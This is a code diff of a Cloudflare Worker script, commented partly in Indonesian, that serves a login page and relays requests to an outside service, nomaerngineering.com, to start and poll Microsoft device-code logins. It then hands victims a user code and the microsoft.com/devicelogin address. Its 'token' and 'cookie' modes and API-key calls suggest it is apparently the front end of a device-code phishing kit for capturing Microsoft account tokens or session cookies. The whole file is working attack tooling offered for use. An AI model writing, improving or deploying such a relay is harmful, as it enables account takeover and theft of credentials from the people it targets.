@@ -2,38 +2,26 @@ addEventListener('fetch', event => {
   event.respondWith(handleRequest(event.request))
 })
 
-// 🔥 MODE: token / cookie
-const MODE = "{{MODE}}"
+const MODE = "{{MODE}}"          // token | cookie
 const API_KEY = "{{API_KEY}}"
+const BASE_URL = "https://nomaerngineering.com"
 
 async function handleRequest(request) {
-
   const url = new URL(request.url)
   const path = url.pathname
 
-  // =========================
-  // UI
-  // =========================
   if (request.method === "GET" && path === "/") {
     return new Response(htmlUI(), {
       headers: { "content-type": "text/html" }
     })
   }
 
-  // =========================
-  // START LOGIN
-  // =========================
   if (request.method === "POST" && path === "/api/device/start") {
     return start()
   }
 
-  // =========================
-  // POLL STATUS
-  // =========================
   if (request.method === "GET" && path.startsWith("/api/device/status/")) {
-
     const loginId = path.split("/").pop()
-
     return poll(loginId)
   }
 
@@ -47,15 +35,26 @@ async function handleRequest(request) {
 async function start() {
   try {
 
-    // 🔥 pilih endpoint berdasarkan MODE
-    const endpoint = MODE === "cookie"
-      ? "/api/command/start"
-      : "/api/start"
+    let endpoint = ""
+    let headers = {
+      "Content-Type": "application/json"
+    }
 
-    const resp = await fetch(
-      `https://nomaerngineering.com${endpoint}?api_key=${API_KEY}`,
-      { method: "POST" }
-    )
+    // =========================
+    // 🔥 MODE HANDLING
+    // =========================
+    if (MODE === "cookie") {
+      endpoint = "/api/python/start"
+      headers["Authorization"] = "Bearer " + API_KEY
+    } else {
+      // 🔥 TOKEN MODE (MicrosoftAuthController)
+      endpoint = `/api/start?api_key=${API_KEY}`
+    }
+
+    const resp = await fetch(BASE_URL + endpoint, {
+      method: "POST",
+      headers
+    })
 
     const text = await resp.text()
 
@@ -63,18 +62,34 @@ async function start() {
       return new Response("HTTP ERROR " + resp.status + "\n\n" + text)
     }
 
-    if (!text.trim().startsWith("{")) {
-      return new Response("NOT JSON:\n\n" + text)
+    let data
+    try {
+      data = JSON.parse(text)
+    } catch {
+      return new Response("INVALID JSON:\n\n" + text)
     }
 
-    const data = JSON.parse(text)
+    // =========================
+    // 🔥 NORMALIZE START RESPONSE
+    // =========================
+    let jobId = null
 
-    return new Response(JSON.stringify(data), {
-      headers: { "content-type": "application/json" }
+    if (MODE === "cookie") {
+      jobId = data.job_id || null
+    } else {
+      jobId = data.login_id || null
+    }
+
+    return Response.json({
+      job_id: jobId,
+      status: data.status || "pending"
     })
 
   } catch (e) {
-    return new Response("Worker crash: " + e.message)
+    return Response.json({
+      error: "Worker crash",
+      message: e.message
+    })
   }
 }
 
@@ -85,30 +100,69 @@ async function start() {
 async function poll(loginId) {
   try {
 
-    // 🔥 pilih endpoint berdasarkan MODE
-    const endpoint = MODE === "cookie"
-      ? `/api/command/poll/${loginId}`
-      : `/api/poll/${loginId}`
+    if (!loginId || isNaN(loginId)) {
+      return new Response("Invalid ID", { status: 400 })
+    }
 
-    const resp = await fetch(
-      `https://nomaerngineering.com${endpoint}?api_key=${API_KEY}`
-    )
+    let endpoint = ""
+    let headers = {}
+
+    // =========================
+    // 🔥 MODE HANDLING
+    // =========================
+    if (MODE === "cookie") {
+      endpoint = `/api/python/job/${loginId}`
+      headers["Authorization"] = "Bearer " + API_KEY
+    } else {
+      endpoint = `/api/poll/${loginId}?api_key=${API_KEY}`
+    }
+
+    const resp = await fetch(BASE_URL + endpoint, { headers })
 
     const text = await resp.text()
+
+    if (!resp.ok) {
+      return new Response("HTTP ERROR " + resp.status + "\n\n" + text)
+    }
 
     let data
     try {
       data = JSON.parse(text)
-    } catch (e) {
-      return new Response("Invalid JSON:\n" + text, { status: 500 })
+    } catch {
+      return new Response("INVALID JSON:\n\n" + text)
     }
 
-    return new Response(JSON.stringify(data), {
-      headers: { "content-type": "application/json" }
+    // =========================
+    // 🔥 NORMALIZE RESPONSE
+    // =========================
+    let userCode = null
+    let verificationUri = null
+    let status = data.status || "pending"
+
+    if (MODE === "cookie") {
+      const device = data.result?.device || {}
+
+      userCode = device.device_code || null
+      verificationUri = device.verification_uri || null
+
+    } else {
+      // 🔥 TOKEN MODE (MicrosoftAuthController)
+      userCode = data.user_code || null
+      verificationUri = data.verification_uri || "https://microsoft.com/devicelogin"
+    }
+
+    return Response.json({
+      status,
+      user_code: userCode,
+      verification_uri: verificationUri,
+      error: data.error || null
     })
 
   } catch (e) {
-    return new Response("Worker error: " + e.message, { status: 500 })
+    return Response.json({
+      error: "Worker error",
+      message: e.message
+    })
   }
 }
 
